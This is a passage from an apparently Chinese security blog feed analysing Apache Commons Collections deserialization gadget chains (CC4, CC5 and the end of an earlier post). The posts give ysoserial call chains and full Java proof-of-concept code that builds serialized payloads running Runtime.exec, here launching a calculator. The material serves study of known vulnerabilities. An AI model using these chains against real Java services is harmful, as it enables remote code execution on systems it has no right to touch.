class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections4利用链分析</title>
      <link href="/2022/11/10/CommonsCollections4/"/>
      <url>/2022/11/10/CommonsCollections4/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections4利用链分析"><a href="#CommonsCollections4利用链分析" class="headerlink" title="CommonsCollections4利用链分析"></a>CommonsCollections4利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续来看<code>CommonsCollections4</code>的链子，在<code>ysoserial</code>里的注释说明是在<code>CommonsCollections2</code>的基础上，使用<code>InstantiateTransformer</code>类替代<code>InvokerTransformer</code>类<br><img src="images/image-20221011105116866.png" alt="image-20221011105116866"></p><p>因此利用链为：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>环境和<code>CommonsCollections2</code>一样<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>其实到这里已经没有什么好分析的了，就是把<code>CommonsCollections2</code>中的<code>InvokerTransformer</code>替换成<code>CommonsCollections3</code>中学习到的<code>InstantiateTransformer</code>，所有知识都是前面分析过的，这里就不再赘述了，可以直接写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections4</span> <span class="variable">commonsCollections4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections4</span>();</span><br><span class="line">        commonsCollections4.serialize();</span><br><span class="line">        commonsCollections4.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221011110805910.png" alt="image-20221011110805910"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections5利用链分析</title>
      <link href="/2022/11/10/CommonsCollections5/"/>
      <url>/2022/11/10/CommonsCollections5/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections5-利用链分析"><a href="#CommonsCollections5-利用链分析" class="headerlink" title="CommonsCollections5 利用链分析"></a>CommonsCollections5 利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天接着学习<code>CommonsCollections5</code>利用链，利用环境如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK 8u76之前</span><br></pre></td></tr></table></figure></p><p><code>ysoserial</code>给出的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>前面的<code>BadAttributeValueExpException</code>和<code>TiedMapEntry</code>倒是新知识，后面的则是前面<code>CommonsCollections1</code>的内容。看样子这条链子是找了其他能触发<code>LazyMap#get()</code>的方法。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>按照利用链跟进能触发<code>LazyMap#get()</code>方法的<code>TiedMapEntry</code>类的<code>toString()</code>方法<br><img src="images/image-20221011112752765.png" alt="image-20221011112752765"></p><p>跟进<code>getValue()</code>方法源码<br><img src="images/image-20221011112827805.png" alt="image-20221011112827805"></p><p>可以看到调用了<code>map.get()</code>方法，而<code>map</code>是通过构造方法传入的值，完全可控。接下来就是找到能触发<code>TiedMapEntry#toString()</code>方法的地方，在<code>CommonsCollections5</code>用到的是<code>BadAttributeValueExpException</code>类，跟进该类的<code>readObject()</code>方法<br><img src="images/image-20221011144219939.png" alt="image-20221011144219939"></p><p>其中<code>valObj</code>是从成员属性取的<code>val</code>，而<code>val</code>我们可以通过反射控制，因此成为可控点。并且<code>System.getSecurityManager()</code>方法默认为<code>null</code>，因此可以进入<code>else if</code>条件触发<code>valObj.toString();</code></p><p>开始编写 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/11 11:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections5</span> <span class="variable">commonsCollections5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections5</span>();</span><br><span class="line">        commonsCollections5.serialize();</span><br><span class="line">        commonsCollections5.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="number">666</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 